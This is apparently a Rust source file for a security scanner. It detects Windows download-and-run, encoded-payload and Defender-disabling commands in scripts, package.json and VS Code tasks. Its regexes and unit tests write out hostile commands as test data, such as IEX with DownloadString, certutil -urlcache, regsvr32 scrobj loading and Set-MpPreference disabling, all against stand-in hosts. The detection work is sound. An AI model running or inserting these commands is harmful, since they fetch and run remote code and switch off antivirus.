//! The Windows loader rules: command lines that download code, run code from
//! a string, decode a payload or switch off the antivirus.
//!
//! - `run.windows-remote-code`: `IEX` / `Invoke-Expression` together with a
//!   download (`DownloadString`, `iwr`, `Invoke-WebRequest`, `curl`, ...);
//!   `certutil -urlcache`; `bitsadmin /transfer` or `/addfile`; `mshta` with a
//!   URL or `vbscript:` / `javascript:`; `regsvr32 /i:` with a URL or `scrobj`;
//!   `rundll32` with `javascript:`, `vbscript:` or `mshtml,RunHTMLApplication`.
//! - `obfuscation.windows-encoded-payload`: `powershell -EncodedCommand` (or any
//!   prefix down to `-e`) with a long base64 operand; `certutil -decode` and
//!   `-decodehex`; `IEX` of `FromBase64String`.
//! - `run.windows-defender-exclusion`: `Add-MpPreference -ExclusionPath`,
//!   `-ExclusionProcess`, `-ExclusionExtension` and `Set-MpPreference -Disable...`.
//!
//! The rules read `.ps1`, `.psm1`, `.bat`, `.cmd`, `.vbs`, `.hta`, `.wsf`, the
//! command strings of `package.json` scripts and of the tasks in
//! `.vscode/tasks.json` and `*.code-workspace`. "Together with" means the same
//! logical line: a physical line joined with the lines a continuation (`^` in
//! batch files, a backtick or an open bracket in PowerShell, ` _` in VBScript)
//! attaches to it. Before matching, the text is read the way the shell would:
//! carets and empty `""` pairs are dropped from batch files, backticks from
//! PowerShell, option dashes of any kind become `-`, and everything is
//! lowercased. Comment lines are skipped.
//!
//! These are line signatures. Known gaps (listed in `docs/DETECTIONS.md`):
//! download and execution on different lines, `%VAR:~n,m%` substrings and
//! variables joined into a command, string concatenation, the `-f` operator,
//! `[char]` arrays and `Set-Alias` in PowerShell, `"power" & "shell"` and `Chr()`
//! in VBScript, and the same words in files of other types.

use std::ops::Range;
use std::sync::LazyLock;

use regex::Regex;

use super::{Ctx, Hit, TextSpan};
use crate::finding::Severity;
use crate::jsonc::Node;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum WinKind {
    Remote,
    Encoded,
    Defender,
}

#[derive(Debug, Clone)]
pub(crate) struct WinFound {
    pub kind: WinKind,
    pub severity: Severity,
    pub line: usize,
    pub span: Range<usize>,
    pub reason: String,
}

/// A command line as the shell sees it.
struct Logical {
    text: String,
    /// Byte range of its first physical line in `Ctx::text`.
    span: Range<usize>,
    /// 1-based number of that line.
    line: usize,
}

/// Physical lines joined into one logical line, at most.
const MAX_JOINED_LINES: usize = 40;

fn rx(pattern: &str) -> Regex {
    Regex::new(pattern).expect("valid pattern")
}

static ANY_URL: LazyLock<Regex> = LazyLock::new(|| rx(r#"(?:https?|ftp)://[^\s'"`)<>;|,]+"#));

/// Installers that honest setup scripts pipe into IEX, by their exact address.
/// The address must be the whole URL: `https://chocolatey.org@host/...` or a
/// longer path is not on the list. The code still comes from the network, so
/// the finding stays (MEDIUM).
const KNOWN_INSTALLERS: &[&str] = &[
    "https://community.chocolatey.org/install.ps1",
    "https://chocolatey.org/install.ps1",
    "https://get.scoop.sh",
    "https://raw.githubusercontent.com/scoopinstaller/install/master/install.ps1",
    "https://aka.ms/install-powershell.ps1",
    "https://dot.net/v1/dotnet-install.ps1",
    "https://deno.land/install.ps1",
    "https://bun.sh/install.ps1",
    "https://astral.sh/uv/install.ps1",
];

/// The line Scoop documents, with the address written without a scheme. It is
/// accepted only as the whole line, since a second address with no scheme would
/// otherwise go unseen.
static BARE_SCOOP: LazyLock<Regex> = LazyLock::new(|| {
    rx(
        r"^\s*(?:irm|iwr(?:\s+-useb(?:asicparsing)?)?|invoke-restmethod|invoke-webrequest(?:\s+-usebasicparsing)?)\s+get\.scoop\.sh\s*\|\s*(?:iex|invoke-expression)\s*$",
    )
});

/// Whether every URL on the line is a known installer (and there is one).
fn only_known_installers(text: &str) -> bool {
    let mut any = BARE_SCOOP.is_match(text);
    for url in ANY_URL.find_iter(text) {
        any = true;
        let url = url.as_str().trim_end_matches(['.', '/']);
        if !KNOWN_INSTALLERS.contains(&url) {
            return false;
        }
    }
    any
}

static EXEC: LazyLock<Regex> =
    LazyLock::new(|| rx(r"\biex\b|invoke-expression|\[scriptblock\]::create|invoke-command"));
static DOWNLOAD: LazyLock<Regex> = LazyLock::new(|| {
    rx(
        r"downloadstring|downloaddata|downloadfile|invoke-webrequest|\biwr\b|invoke-restmethod|\birm\b|\bcurl\b|\bwget\b|start-bitstransfer|net\.webclient|\bwebclient\b",
    )
});
static FROM_BASE64: LazyLock<Regex> = LazyLock::new(|| rx(r"frombase64string"));
static URL: LazyLock<Regex> = LazyLock::new(|| rx(r"(?:https?|ftp)://|\\\\[a-z0-9.\-]+\\"));
static CERTUTIL_DOWNLOAD: LazyLock<Regex> =
    LazyLock::new(|| rx(r"\bcertutil(?:\.exe)?\b.*?[-/]urlcache\b"));
static CERTUTIL_VERIFY: LazyLock<Regex> =
    LazyLock::new(|| rx(r"\bcertutil(?:\.exe)?\b.*?[-/]verifyctl\b"));
static CERTUTIL_DECODE: LazyLock<Regex> =
    LazyLock::new(|| rx(r"\bcertutil(?:\.exe)?\b.*?[-/]decode(?:hex)?\b"));
static BITSADMIN: LazyLock<Regex> =
    LazyLock::new(|| rx(r"\bbitsadmin(?:\.exe)?\b.*?[-/](?:transfer|addfile)\b"));
static MSHTA: LazyLock<Regex> = LazyLock::new(|| {
    rx(r#"\bmshta(?:\.exe)?\s+(?:\S*(?:https?|ftp)://|\\\\|["']?(?:vbscript|javascript|about):)"#)
});
static REGSVR_URL: LazyLock<Regex> =
    LazyLock::new(|| rx(r"\bregsvr32(?:\.exe)?\b.*?[-/]i:\S*(?:(?:https?|ftp)://|\\\\)"));
static REGSVR_SCROBJ: LazyLock<Regex> =
    LazyLock::new(|| rx(r"\bregsvr32(?:\.exe)?\b.*?[-/]i:.*scrobj"));
static RUNDLL: LazyLock<Regex> = LazyLock::new(|| {
    rx(r"\brundll32(?:\.exe)?\b.*?(?:javascript:|vbscript:|mshtml\s*,\s*runhtmlapplication)")
});
static POWERSHELL_ENC: LazyLock<Regex> = LazyLock::new(|| {
    rx(
        r#"\b(?:powershell|pwsh|powershell_ise)(?:\.exe)?\b.*?\s[-/]e(?:c|nc?o?d?e?d?c?o?m?m?a?n?d?)?\s+["']?[a-z0-9+/=]{40,}"#,
    )
});
static HIDDEN_WINDOW: LazyLock<Regex> = LazyLock::new(|| {
    rx(
        r"\s[-/]w(?:i|in|ind|indo|indow|indows|indowst|indowsty|indowstyl|indowstyle)?\s+h(?:i|id|idd|idde|idden)?\b",
    )
});
static DEFENDER_EXCLUDE: LazyLock<Regex> =
    LazyLock::new(|| rx(r"\badd-mppreference\b.*?[-/]exclusion(?:path|process|extension)\b"));
static DEFENDER_DISABLE: LazyLock<Regex> =
    LazyLock::new(|| rx(r"\bset-mppreference\b.*?[-/]disable[a-z]+"));

// ---------------------------------------------------------------- reading

#[derive(Clone, Copy, PartialEq, Eq)]
enum Flavor {
    Batch,
    PowerShell,
    /// VBScript, and the HTML and XML hosts of it.
    Script,
}

fn flavor(path: &str) -> Option<Flavor> {
    let lower = path.to_ascii_lowercase();
    let ext = lower.rsplit_once('.')?.1;
    match ext {
        "bat" | "cmd" => Some(Flavor::Batch),
        "ps1" | "psm1" => Some(Flavor::PowerShell),
        "vbs" | "hta" | "wsf" => Some(Flavor::Script),
        _ => None,
    }
}

/// Option dashes of any kind become `-`, and letters are lowercased.
fn normalize(text: &str) -> String {
    text.chars()
        .map(|c| match c {
            '\u{2013}'..='\u{2015}' => '-',
            c => c.to_ascii_lowercase(),
        })
        .collect()
}

/// A batch line without its carets and empty quote pairs; true if it ends with
/// a caret, which joins the next line.
fn batch_clean(raw: &str) -> (String, bool) {
    let mut out = String::with_capacity(raw.len());
    let mut chars = raw.chars();
    let mut continued = false;
    while let Some(c) = chars.next() {
        if c == '^' {
            match chars.next() {
                Some(next) => out.push(next),
                None => continued = true,
            }
        } else {
            out.push(c);
        }
    }
    (out.replace("\"\"", ""), continued)
}

fn is_batch_comment(line: &str) -> bool {
    let trimmed = line.trim_start_matches(['@', ' ', '\t']);
    let lower = trimmed.to_ascii_lowercase();
    trimmed.starts_with("::")
        || lower == "rem"
        || (lower.starts_with("rem") && lower[3..].starts_with([' ', '\t', '.']))
}

/// State carried across the lines of a PowerShell file.
#[derive(Default)]
struct PsState {
    depth: i32,
    block_comment: bool,
}

/// A PowerShell line without comments and backticks; true if the statement goes
/// on in the next line (a backtick, an open bracket or a trailing pipe).
fn powershell_clean(raw: &str, state: &mut PsState) -> (String, bool) {
    let mut out = String::with_capacity(raw.len());
    let mut chars = raw.chars().peekable();
    let (mut single, mut double) = (false, false);
    let mut continued = false;
    while let Some(c) = chars.next() {
        if state.block_comment {
            if c == '#' && chars.peek() == Some(&'>') {
                chars.next();
                state.block_comment = false;
            }
            continue;
        }
        match c {
            '`' => match chars.next() {
                Some(next) => out.push(next),
                None => continued = true,
            },
            '<' if !single && !double && chars.peek() == Some(&'#') => {
                chars.next();
                state.block_comment = true;
            }
            '\'' if !double => {
                single = !single;
                out.push(c);
            }
            '"' if !single => {
                double = !double;
                out.push(c);
            }
            '(' | '{' | '[' if !single && !double => {
                state.depth += 1;
                out.push(c);
            }
            ')' | '}' | ']' if !single && !double => {
                state.depth = (state.depth - 1).max(0);
                out.push(c);
            }
            _ => out.push(c),
        }
    }
    let trailing_pipe = out.trim_end().ends_with('|');
    (out, continued || state.depth > 0 || trailing_pipe)
}

fn is_script_comment(line: &str) -> bool {
    let trimmed = line.trim_start();
    let lower = trimmed.to_ascii_lowercase();
    trimmed.starts_with('\'') || lower == "rem" || lower.starts_with("rem ")
}

/// The logical lines of a script in a file of the given flavor.
fn script_lines(text: &str, flavor: Flavor) -> Vec<Logical> {
    let mut out = Vec::new();
    let mut state = PsState::default();
    let mut current: Option<Logical> = None;
    let mut joined = 0usize;
    let mut offset = 0usize;
    for (index, physical) in text.split('\n').enumerate() {
        let start = offset;
        offset += physical.len() + 1;
        let raw = physical.strip_suffix('\r').unwrap_or(physical);
        let starting = current.is_none();
        let (clean, continued) = match flavor {
            Flavor::Batch => {
                if starting && is_batch_comment(raw) {
                    continue;
                }
                batch_clean(raw)
            }
            Flavor::PowerShell => {
                if starting && !state.block_comment && raw.trim_start().starts_with('#') {
                    continue;
                }
                powershell_clean(raw, &mut state)
            }
            Flavor::Script => {
                if starting && is_script_comment(raw) {
                    continue;
                }
                match raw.strip_suffix(" _") {
                    Some(rest) => (rest.to_string(), true),
                    None => (raw.to_string(), false),
                }
            }
        };
        let logical = current.get_or_insert_with(|| Logical {
            text: String::new(),
            span: start..start + raw.len(),
            line: index + 1,
        });
        if !logical.text.is_empty() {
            logical.text.push(' ');
        }
        logical.text.push_str(&clean);
        joined += 1;
        if continued && joined < MAX_JOINED_LINES {
            continue;
        }
        joined = 0;
        state.depth = 0;
        if let Some(mut done) = current.take() {
            done.text = normalize(&done.text);
            if !done.text.trim().is_empty() {
                out.push(done);
            }
        }
    }
    if let Some(mut done) = current.take() {
        done.text = normalize(&done.text);
        out.push(done);
    }
    out
}

/// Strings of a JSON document that are command lines, with the line each is on.
fn json_commands(ctx: &Ctx<'_>, tasks: bool) -> Vec<Logical> {
    let Ok(root) = ctx.jsonc() else {
        return Vec::new();
    };
    let mut out = Vec::new();
    let text = ctx.text();
    let mut push = |node: &Node, command: String| {
        let line = ctx.line_of(node.offset);
        let start = node.offset.min(text.len());
        let end = node.end.clamp(start, text.len());
        out.push(Logical {
            text: normalize(&command),
            span: start..end,
            line,
        });
    };
    if tasks {
        collect_tasks(root, &mut push, 0);
    } else if let Some(scripts) = root.get("scripts")
        && let crate::jsonc::Value::Object(members) = &scripts.value
    {
        for member in members {
            if let Some(command) = member.value.as_str() {
                push(&member.value, command.to_string());
            }
        }
    }
    out
}

/// Every object with a `command` (a VS Code task, or its per-OS override): the
/// command and its arguments make one command line.
fn collect_tasks(node: &Node, push: &mut impl FnMut(&Node, String), depth: usize) {
    use crate::jsonc::Value;
    if depth > 16 {
        return;
    }
    match &node.value {
        Value::Object(members) => {
            let command = members.iter().rev().find(|m| m.key == "command");
            if let Some(command) = command
                && let Some(text) = command.value.as_str()
            {
                let mut line = text.to_string();
                if let Some(args) = members.iter().rev().find(|m| m.key == "args") {
                    for arg in args.value.as_array().unwrap_or_default() {
                        let value = arg.as_str().map(str::to_string).or_else(|| {
                            arg.get("value")
                                .and_then(|v| v.as_str())
                                .map(str::to_string)
                        });
                        if let Some(value) = value {
                            line.push(' ');
                            line.push_str(&value);
                        }
                    }
                }
                push(&command.value, line);
            }
            for member in members {
                if member.key != "command" && member.key != "args" {
                    collect_tasks(&member.value, push, depth + 1);
                }
            }
        }
        Value::Array(items) => {
            for item in items {
                collect_tasks(item, push, depth + 1);
            }
        }
        _ => {}
    }
}

// ---------------------------------------------------------------- judging

fn push(
    found: &mut Vec<WinFound>,
    logical: &Logical,
    kind: WinKind,
    severity: Severity,
    reason: &str,
) {
    found.push(WinFound {
        kind,
        severity,
        line: logical.line,
        span: logical.span.clone(),
        reason: reason.to_string(),
    });
}

/// Judges one command line.
fn judge(logical: &Logical, found: &mut Vec<WinFound>) {
    let text = logical.text.as_str();
    let downloads = DOWNLOAD.is_match(text);
    let executes = EXEC.is_match(text);
    let url = URL.is_match(text);

    // Download and run.
    if executes && downloads {
        if only_known_installers(text) {
            push(
                found,
                logical,
                WinKind::Remote,
                Severity::Medium,
                "Invoke-Expression (IEX) runs the result of a download on the same line, from the address of a well-known installer; the code is still fetched and run in one step, so check that it is the installer you expect",
            );
        } else {
            push(
                found,
                logical,
                WinKind::Remote,
                Severity::Critical,
                "Invoke-Expression (IEX) runs the result of a download on the same line: code is fetched and run in one step",
            );
        }
    }
    if CERTUTIL_DOWNLOAD.is_match(text) {
        push(
            found,
            logical,
            WinKind::Remote,
            Severity::Critical,
            "`certutil -urlcache` downloads a file; it is a known way to fetch a payload with a program that is already on the machine",
        );
    } else if CERTUTIL_VERIFY.is_match(text) && url {
        push(
            found,
            logical,
            WinKind::Remote,
            Severity::Critical,
            "`certutil -verifyctl` with a URL downloads a file through the certificate tool",
        );
    }
    if BITSADMIN.is_match(text) {
        let (severity, why) = if url {
            (
                Severity::Critical,
                "`bitsadmin /transfer` downloads a file from a URL",
            )
        } else {
            (
                Severity::High,
                "`bitsadmin /transfer` copies a file in the background",
            )
        };
        push(found, logical, WinKind::Remote, severity, why);
    }
    if MSHTA.is_match(text) {
        push(
            found,
            logical,
            WinKind::Remote,
            Severity::Critical,
            "`mshta` runs a script from a URL or from a `vbscript:` / `javascript:` string",
        );
    }
    if REGSVR_URL.is_match(text) {
        push(
            found,
            logical,
            WinKind::Remote,
            Severity::Critical,
            "`regsvr32 /i:` with a URL loads a script from the network through scrobj.dll",
        );
    } else if REGSVR_SCROBJ.is_match(text) {
        push(
            found,
            logical,
            WinKind::Remote,
            Severity::High,
            "`regsvr32 /i:` with scrobj.dll runs a scriptlet",
        );
    }
    if RUNDLL.is_match(text) {
        push(
            found,
            logical,
            WinKind::Remote,
            Severity::Critical,
            "`rundll32` runs a `javascript:` or `vbscript:` string or an HTML application",
        );
    }

    // Encoded payloads.
    if POWERSHELL_ENC.is_match(text) {
        let hidden = HIDDEN_WINDOW.is_match(text);
        let (severity, why) = if hidden || downloads {
            (
                Severity::Critical,
                "powershell runs an encoded command in a hidden window or next to a download: the command is hidden from a reader and from the user",
            )
        } else {
            (
                Severity::High,
                "powershell -EncodedCommand runs a base64 string: what it does cannot be read in the file",
            )
        };
        push(found, logical, WinKind::Encoded, severity, why);
    }
    if CERTUTIL_DECODE.is_match(text) {
        push(
            found,
            logical,
            WinKind::Encoded,
            Severity::High,
            "`certutil -decode` turns a text file into a binary one, a common way to unpack a payload that was committed as text",
        );
    }
    if executes && FROM_BASE64.is_match(text) {
        push(
            found,
            logical,
            WinKind::Encoded,
            Severity::High,
            "Invoke-Expression runs a base64 string decoded with FromBase64String",
        );
    }

    // Antivirus.
    if DEFENDER_EXCLUDE.is_match(text) {
        push(
            found,
            logical,
            WinKind::Defender,
            Severity::High,
            "`Add-MpPreference -Exclusion...` tells Windows Defender not to scan a path, process or extension",
        );
    }
    if DEFENDER_DISABLE.is_match(text) {
        push(
            found,
            logical,
            WinKind::Defender,
            Severity::High,
            "`Set-MpPreference -Disable...` switches a Windows Defender protection off",
        );
    }
}

/// All findings of the three rules in one file.
pub(crate) fn analyze(ctx: &Ctx<'_>) -> Vec<WinFound> {
    let lower = ctx.path.to_ascii_lowercase();
    let name = lower.rsplit('/').next().unwrap_or(&lower);
    let lines = if name == "package.json" {
        json_commands(ctx, false)
    } else if lower.ends_with(".vscode/tasks.json") || lower.ends_with(".code-workspace") {
        json_commands(ctx, true)
    } else if let Some(flavor) = flavor(&lower) {
        script_lines(ctx.text(), flavor)
    } else {
        return Vec::new();
    };
    let mut found = Vec::new();
    for logical in &lines {
        judge(logical, &mut found);
    }
    found
}

fn hits(ctx: &Ctx<'_>, kind: WinKind) -> Vec<Hit> {
    ctx.win_flow()
        .iter()
        .filter(|found| found.kind == kind)
        .map(|found| Hit {
            line: found.line,
            severity: found.severity,
            reason: found.reason.clone(),
            span: Some(TextSpan(found.span.clone())),
        })
        .collect()
}

/// Rule `run.windows-remote-code`.
pub fn remote_code(ctx: &Ctx<'_>) -> Vec<Hit> {
    hits(ctx, WinKind::Remote)
}

/// Rule `obfuscation.windows-encoded-payload`.
pub fn encoded_payload(ctx: &Ctx<'_>) -> Vec<Hit> {
    hits(ctx, WinKind::Encoded)
}

/// Rule `run.windows-defender-exclusion`.
pub fn defender_exclusion(ctx: &Ctx<'_>) -> Vec<Hit> {
    hits(ctx, WinKind::Defender)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn judged(text: &str, flavor: Flavor) -> Vec<(WinKind, Severity, usize)> {
        let mut found = Vec::new();
        for logical in script_lines(text, flavor) {
            judge(&logical, &mut found);
        }
        found
            .into_iter()
            .map(|f| (f.kind, f.severity, f.line))
            .collect()
    }

    fn ps(text: &str) -> Vec<(WinKind, Severity, usize)> {
        judged(text, Flavor::PowerShell)
    }

    fn bat(text: &str) -> Vec<(WinKind, Severity, usize)> {
        judged(text, Flavor::Batch)
    }

    const B64: &str = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAnAA==";

    #[test]
    fn iex_with_a_download_on_one_logical_line() {
        let rows =
            ps("IEX (New-Object Net.WebClient).DownloadString('https://x.example.invalid/a')");
        assert_eq!(rows, [(WinKind::Remote, Severity::Critical, 1)]);
        assert_eq!(ps("iwr https://x.example.invalid/a | iex").len(), 1);
        // Another line, a comment, or one word alone is not enough.
        assert!(ps("iex $cmd\niwr https://x.example.invalid/a -OutFile a").is_empty());
        assert!(ps("# iex (iwr https://x.example.invalid/a)").is_empty());
        assert!(ps("Invoke-WebRequest https://x.example.invalid/a -OutFile a").is_empty());
    }

    #[test]
    fn a_well_known_installer_is_medium_and_anything_else_on_the_line_is_not() {
        let level = |text: &str| ps(text).first().map(|r| r.1);
        assert_eq!(
            level(
                "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
            ),
            Some(Severity::Medium)
        );
        assert_eq!(level("irm get.scoop.sh | iex"), Some(Severity::Medium));
        assert_eq!(
            level("irm get.scoop.sh.evil.example.invalid | iex"),
            Some(Severity::Critical)
        );
        assert_eq!(
            level("iwr -useb https://get.scoop.sh | iex"),
            Some(Severity::Medium)
        );
        // A look-alike, a longer address, a second address, user information.
        for bad in [
            "iex (iwr https://chocolatey.org.evil.example.invalid/install.ps1)",
            "iex (iwr https://chocolatey.org/install.ps1/../x.ps1)",
            "iex (iwr https://chocolatey.org@evil.example.invalid/install.ps1)",
            "iex (iwr https://chocolatey.org/install.ps1); iex (iwr https://x.example.invalid/a)",
            "iex (iwr http://chocolatey.org/install.ps1)",
        ] {
            assert_eq!(level(bad), Some(Severity::Critical), "{bad}");
        }
    }

    #[test]
    fn backticks_brackets_and_pipes_join_lines() {
        assert_eq!(ps("iex `\n  (iwr https://x.example.invalid/a)").len(), 1);
        assert_eq!(ps("iex (\n  iwr https://x.example.invalid/a\n)").len(), 1);
        assert_eq!(ps("iwr https://x.example.invalid/a |\n  iex").len(), 1);
        assert_eq!(ps("I`E`X (iwr https://x.example.invalid/a)").len(), 1);
        assert_eq!(
            ps("<# note #> iex (iwr https://x.example.invalid/a)").len(),
            1
        );
        assert!(ps("<#\niex (iwr https://x.example.invalid/a)\n#>").is_empty());
    }

    #[test]
    fn the_line_reported_is_the_first_of_a_joined_command() {
        let rows = ps("echo ok\niex `\n (iwr https://x.example.invalid/a)");
        assert_eq!(rows, [(WinKind::Remote, Severity::Critical, 2)]);
    }

    #[test]
    fn encoded_command_with_any_prefix_of_the_switch() {
        for switch in ["-e", "-ec", "-enc", "-EncodedCommand", "/enc", "–enc"] {
            let line = format!("powershell {switch} {B64}");
            assert_eq!(ps(&line), [(WinKind::Encoded, Severity::High, 1)], "{line}");
        }
        let hidden = format!("powershell.exe -NoP -W Hidden -Enc {B64}");
        assert_eq!(ps(&hidden), [(WinKind::Encoded, Severity::Critical, 1)]);
        // A short operand, other switches and other programs are not it.
        assert!(ps("powershell -e hello").is_empty());
        assert!(ps(&format!("powershell -ExecutionPolicy Bypass -File {B64}")).is_empty());
        assert!(ps(&format!("echo -enc {B64}")).is_empty());
    }

    #[test]
    fn certutil_bitsadmin_mshta_regsvr32_rundll32() {
        let remote = |text: &str| {
            bat(text)
                .into_iter()
                .filter(|r| r.0 == WinKind::Remote)
                .map(|r| r.1)
                .collect::<Vec<_>>()
        };
        assert_eq!(
            remote("certutil -urlcache -f http://x.example.invalid/a a"),
            [Severity::Critical]
        );
        assert_eq!(
            remote("cert^util -url^cache -f http://x.example.invalid/a a"),
            [Severity::Critical]
        );
        assert_eq!(
            remote("bitsadmin /transfer j http://x.example.invalid/a a"),
            [Severity::Critical]
        );
        assert_eq!(
            remote("bitsadmin /transfer j C:\\a D:\\b"),
            [Severity::High]
        );
        assert_eq!(
            remote("mshta http://x.example.invalid/a.hta"),
            [Severity::Critical]
        );
        assert_eq!(
            remote("mshta vbscript:Execute(\"x\")"),
            [Severity::Critical]
        );
        assert_eq!(
            remote("regsvr32 /s /n /u /i:http://x.example.invalid/a.sct scrobj.dll"),
            [Severity::Critical]
        );
        assert_eq!(
            remote("rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \""),
            [Severity::Critical]
        );
        // Honest uses of the same programs.
        for honest in [
            "certutil -hashfile a.exe SHA256",
            "bitsadmin /list",
            "mshta C:\\local\\app.hta",
            "regsvr32 /s mylib.dll",
            "rundll32 user32.dll,LockWorkStation",
            "rem certutil -urlcache -f http://x.example.invalid/a a",
            ":: mshta http://x.example.invalid/a.hta",
        ] {
            assert!(remote(honest).is_empty(), "{honest}");
        }
    }

    #[test]
    fn certutil_decode_and_defender_exclusions() {
        assert_eq!(
            bat("certutil -decode a.b64 a.exe"),
            [(WinKind::Encoded, Severity::High, 1)]
        );
        assert_eq!(
            ps("Add-MpPreference -ExclusionPath 'C:\\Fixture'"),
            [(WinKind::Defender, Severity::High, 1)]
        );
        assert_eq!(
            ps("Set-MpPreference -DisableRealtimeMonitoring $true"),
            [(WinKind::Defender, Severity::High, 1)]
        );
        assert!(ps("Get-MpPreference").is_empty());
    }

    #[test]
    fn batch_lines_join_at_a_caret() {
        assert_eq!(
            bat("certutil ^\n -urlcache -f http://x.example.invalid/a a").len(),
            1
        );
        assert_eq!(
            bat("certutil -url\"\"cache -f http://x.example.invalid/a a").len(),
            1
        );
    }

    #[test]
    fn vbscript_lines_join_at_an_underscore() {
        let text = "sh.Run \"powershell _\n -enc ".to_string() + B64 + "\"";
        // The continuation joins the pieces; the operand follows the switch.
        let rows = judged(&text, Flavor::Script);
        assert!(rows.iter().all(|r| r.0 == WinKind::Encoded), "{rows:?}");
        assert!(judged("' mshta http://x.example.invalid/a", Flavor::Script).is_empty());
    }

    #[test]
    fn a_huge_line_is_judged_in_linear_time() {
        let text = "iex ".to_string() + &"a".repeat(2_000_000) + " iwr";
        let started = std::time::Instant::now();
        assert_eq!(ps(&text).len(), 1);
        assert!(started.elapsed().as_secs() < 5);
        let many = "powershell ".repeat(200_000);
        let _ = ps(&many);
    }
}
